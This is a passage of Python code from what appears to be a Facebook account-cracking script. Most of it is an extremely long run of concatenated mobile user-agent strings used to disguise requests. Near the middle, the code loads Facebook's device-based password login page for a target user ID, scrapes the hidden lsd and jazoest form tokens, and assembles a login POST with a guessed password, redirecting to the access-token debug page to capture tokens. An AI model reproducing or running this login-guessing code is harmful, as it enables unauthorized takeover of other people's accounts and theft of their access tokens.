Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A226B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19PG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Home Assistant/2022.9.1-2700 (Android 12; M2012K11AG) Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G780G; Android 12#G780GXXU3CVI1#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G998B; Android 12#G998BXXS5CVHI#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; CPH2009 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(30) Build/S0RCS32.41-10-19-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; motorola edge 20 Build/S1RGS32.53-18-22-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 EdgW/1.0 Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; vivo 1907 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; V2050 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; 2109119DG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A025G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; AC2003 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 webexplorer/4 Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S901B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Doihue/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 appname/PLAYit appverc/20604027 appname/PLAYit appverc/20604027 Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2101K7AG Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Mi Note 10 Lite Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M127F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; IN2023 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2145 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(50) Build/S1RFS32.27-25-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 GNews Android/2022089220",
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"sec-fetch-site": "none",
					"sec-fetch-mode": "navigate",
					"sec-fetch-user": "?1",
					"sec-fetch-dest": "document",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
				post_1 = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
				data_1 = {"lsd":re.search('name="lsd" value="(.*?)"', str(post_1.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(post_1.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				head_1 = {
					"Host": "mbasic.facebook.com",
					"content-length": "275",
					"cache-control": "max-age=0",
					"sec-ch-ua-mobile": "?1",
					"upgrade-insecure-requests": "1",
					"origin": "https://mbasic.facebook.com",
					"content-type": "application/x-www-form-urlencoded",
					"user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A715W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2065 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G715FN Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Pixel 3a Build/SP2A.220505.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Redmi Note 9S Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2197 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2038 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A235M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G781B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Reddit/Version 2022.35.1/Build 589034/Android 12 Mozilla/5.0 (Linux; Android 5.1.1; AFTM Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; RMX3363 Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2204 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; moto g(60) Build/S2RI32.32-20-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UAYSEN/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 wp-android/20.6.1 Mozilla/5.0 (Linux; Android 12; SM-G970U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2273 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Zalo android/12100641 ZaloTheme/dark ZaloLanguage/vi Mozilla/5.0 (Linux; Android 12; SM-A426U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 13; Pixel 4 Build/TP1A.220905.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Onefootball/Android/14.42.1 Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A725F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2195 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F711B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G985F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A226B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19PG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Home Assistant/2022.9.1-2700 (Android 12; M2012K11AG) Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G780G; Android 12#G780GXXU3CVI1#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G998B; Android 12#G998BXXS5CVHI#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; CPH2009 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(30) Build/S0RCS32.41-10-19-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; motorola edge 20 Build/S1RGS32.53-18-22-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 EdgW/1.0 Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; vivo 1907 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; V2050 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; 2109119DG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A025G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; AC2003 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 webexplorer/4 Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S901B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) 